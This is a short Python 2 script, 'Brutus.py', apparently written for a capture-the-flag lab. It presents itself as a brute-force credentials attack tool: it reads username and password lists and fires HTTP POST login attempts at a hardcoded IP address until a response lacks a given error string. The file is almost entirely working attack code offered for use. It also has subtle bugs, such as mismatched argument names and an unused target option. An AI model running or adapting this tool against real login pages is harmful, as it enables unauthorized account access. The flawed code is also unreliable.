#!/usr/bin/python
#
# Brute force attacker
# bl4de | bloorq@gmail.com | Twitter: @_bl4de
#
import argparse
import socket


def create_socket(host, port):
    """creates and returns socket"""
    connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    connection.connect((host, port))
    return connection


def send_request(target, payload, response_size=4096):
    """sends payload to target and returns response"""
    target.send(payload)
    response = target.recv(response_size)
    return response


def create_http_request(path, host, payload_len, method="POST"):
    template = "{} /{} HTTP/1.1\r\nHost: {}\r\n" \
               "Content-Type: application/x-www-form-urlencoded\r\n" \
               "Content-Length: {}\r\n\r\n".format(method, path, host,
                                                   payload_len)
    return template


def single_try(user, passwd, method, counter):
    user = user.strip()
    passwd = passwd.strip()
    print "[*] Trying {}:{}... ({})".format(user, passwd, counter)

    # create POST payload
    payload = "user={}&pass={}&submit=Login".format(user, passwd)
    payload_len = len(payload)

    # create request
    # pwnlab = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    # pwnlab.connect(("192.168.1.2", 80))
    pwnlab = create_socket("192.168.1.2", 80)

    req = create_http_request("?page=login", "192.168.1.2", payload_len, method)
    req += payload + "\r\n\r\n"

    # send request and check response
    resp = send_request(pwnlab, req)

    counter += 1
    if args.e not in resp:
        print "[+] Login sucessful !!!"
        exit("{}:{}".format(user, passwd))


# @TODO: option to define success pattern, multi-threading


if __name__ == "__main__":
    """main program - run HTML analyze"""
    parser = argparse.ArgumentParser(description="""
        Brutus.py - dictionary and bruteforce credentials attack tool

    """)

    parser.add_argument('-t', help='IP or URL of the target')
    parser.add_argument('-s', help='service to be attacked (HTTP, FTP, SSH)')
    parser.add_argument('-m',
                        help="additional parameter, eg . HTTP method (GET/POST)")
    parser.add_argument('-r', help='service TCP port')
    parser.add_argument('-e', help='error message to recognize failed attempt')
    parser.add_argument('-p', help='file with passwords list')
    parser.add_argument('-u', help='file with usernames list')

    args = parser.parse_args()
    passwords = []
    usernames = []

    if args.u:
        usernames = open(args.U, "r").readlines()
    if args.p:
        passwords = open(args.P, "r").readlines()
    if args.m:
        method = args.m
    counter = 1

    if len(passwords) > 0 and len(usernames) > 0:
        print "[*] Will try {} credentials, hold on...".format(
            len(usernames) * len(passwords))
        for user in usernames:
            for passwd in passwords:
                single_try(user, passwd, method, counter)
                counter += 1

        print "[-] All done, valid credentials not found :("
    else:
        print "[-] No usernames and/or passwords provided, exiting..."
        exit(0)
